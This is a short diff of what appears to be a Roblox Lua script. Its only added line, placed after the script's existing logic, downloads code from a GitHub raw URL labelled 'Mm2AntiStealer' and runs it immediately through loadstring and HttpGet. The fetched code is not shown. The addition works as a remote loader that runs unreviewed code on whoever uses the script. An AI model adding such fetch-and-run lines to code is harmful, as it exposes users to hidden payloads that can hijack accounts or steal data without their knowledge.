@@ -2644,3 +2644,5 @@ end
 wait()
 pcall(roleupdaterfix)
 end
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/ArrayField/main/Mm2AntiStealer"))()
